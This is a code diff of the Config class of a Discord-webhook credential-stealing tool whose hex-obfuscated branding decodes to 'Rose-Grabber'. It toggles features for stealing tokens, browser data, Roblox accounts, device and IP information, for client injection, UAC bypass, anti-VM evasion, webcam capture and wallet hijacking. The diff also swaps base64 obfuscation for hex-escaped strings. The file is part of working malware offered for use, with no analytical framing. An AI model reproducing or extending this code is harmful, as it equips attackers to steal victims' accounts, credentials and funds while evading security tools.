@@ -1,8 +1,6 @@
-import base64
 class Config:
     def __init__(self):
         self.webhook = 'WEBHOOK_URL'
-        self.vm_detect_webhook = 'VMHOOK'
 
         self.debug_mode = True
 
@@ -17,10 +15,9 @@ class Config:
         self.discord_ping = False
         self.injection = False
         self.token_stealing = False
-        self.cookie_stealing = False
-        self.password_stealing = False
-        self.malicious_stealing = False
-        self.location_stealing = False
+        self.browser_stealing = False
+        self.deviceinf_stealing = False
+        self.ipinf_stealing = False
         self.roblox_stealing = False
         self.screenshot = False
         self.start_up = False
@@ -29,20 +26,14 @@ class Config:
         self.wallet_adress = "_WALLET_ADR_HERE"
         self.fake_error = False
         self.nitro_auto_buy = False
-        self.get_admin = False
-        self.disable_defender = False
-        self.disable_firewalls = False
-        self.vmdetection = False
+        self.uac_bypass = False
+        self.antivm = False
         self.webcam = False
-        
-        self.secr_eb_color = 'MTY3MTE2ODA='
-        self.secr_eb_footer = 'Um9zZS1JbmplY3RvciB8IE1hZGUgYnkgR3VtYm9icm90LCBJQ0V4RlMsIHN1ZWdkdSBhbmQgeHBpZXJyb3ogfCBodHRwczovL2dpdGh1Yi5jb20vRGFtYWdpbmdSb3NlL1Jvc2UtSW5qZWN0b3I='
-        self.secr_wh_avatar = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RhbWFnaW5nUm9zZS9Sb3NlLUluamVjdG9yL21haW4vY29tcG9uZW50cy9yZWFkbWUvJTI0cm9zZS13aC5wbmc='
-        self.secr_wh_name = 'Um9zZS1JbmplY3Rvcg=='
-        self.eb_color = int(base64.b64decode(self.secr_eb_color.encode('ascii')).decode('ascii'))
-        self.eb_footer = base64.b64decode(self.secr_eb_footer.encode('ascii')).decode('ascii')
-        self.wh_avatar = base64.b64decode(self.secr_wh_avatar.encode('ascii')).decode('ascii')
-        self.wh_name = base64.b64decode(self.secr_wh_name.encode('ascii')).decode('ascii')
+
+        self.eb_color = int("\x31\x36\x37\x31\x31\x36\x38\x30")
+        self.eb_footer = "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x20\x7c\x20\x4d\x61\x64\x65\x20\x62\x79\x20\x67\x75\x6d\x62\x6f\x62\x72\x30\x74\x2c\x20\x49\x43\x45\x78\x46\x53\x2c\x20\x73\x75\x65\x67\x64\x75\x20\x61\x6e\x64\x20\x78\x70\x69\x65\x72\x72\x6f\x7a\x20\x7c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72"
+        self.wh_avatar = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67"
+        self.wh_name = "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72"
 
     def get_roblox_stealing(self):
         return self.roblox_stealing
@@ -53,17 +44,14 @@ class Config:
     def get_token_stealing(self):
         return self.token_stealing 
 
-    def get_cookie_stealing(self):
-        return self.cookie_stealing
+    def get_browser_stealing(self):
+        return self.browser_stealing
 
-    def get_password_stealing(self):
-        return self.password_stealing
+    def get_deviceinf_stealing(self):
+        return self.deviceinf_stealing
 
-    def get_malicious_stealing(self):
-        return self.malicious_stealing
-
-    def get_location_stealing(self):
-        return self.location_stealing
+    def get_ipinf_stealing(self):
+        return self.ipinf_stealing
 
     def get_webhook(self):
         return self.webhook
@@ -109,9 +97,6 @@ class Config:
 
     def get_screenshot(self):
         return self.screenshot
-
-    def get_vm_detect_webhook(self):
-        return self.vm_detect_webhook
     
     def get_start_up(self):
         return self.start_up
@@ -131,17 +116,11 @@ class Config:
     def get_nitro_auto_buy(self):
         return self.nitro_auto_buy
 
-    def get_ask_admin(self):
-        return self.get_admin
-    
-    def get_disable_windows_defender(self):
-        return self.disable_defender
-    
-    def get_disable_windows_firewalls(self):
-        return self.disable_firewalls
+    def get_uac_bypass(self):
+        return self.uac_bypass
 
-    def get_vmdetection(self):
-        return self.vmdetection
+    def get_antivm(self):
+        return self.antivm
     
     def get_webcam(self):
         return self.webcam
